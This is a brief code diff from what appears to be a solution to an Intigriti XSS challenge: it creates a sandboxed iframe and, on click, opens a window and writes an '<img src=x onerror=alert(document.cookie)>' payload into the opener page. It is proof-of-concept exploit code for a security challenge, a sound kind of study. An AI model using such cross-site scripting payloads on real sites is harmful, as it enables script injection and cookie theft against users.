@@ -7,7 +7,7 @@
     iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png'
     iframe.sandbox = 'allow-popups allow-forms allow-same-origin allow-scripts allow-top-navigation allow-popups-to-escape-sandbox'
     iframe.onclick = function(e){
-      var mw = window.open(this.contentWindow.name, this.src);
+      var mw = window.open(this.contentWindow.name, "https://challenge.intigriti.io/static/4/challenge1.png");
       mw.opener.document.write("<img src=x onerror=alert(document.cookie)>");
     }
     document.body.appendChild(iframe);
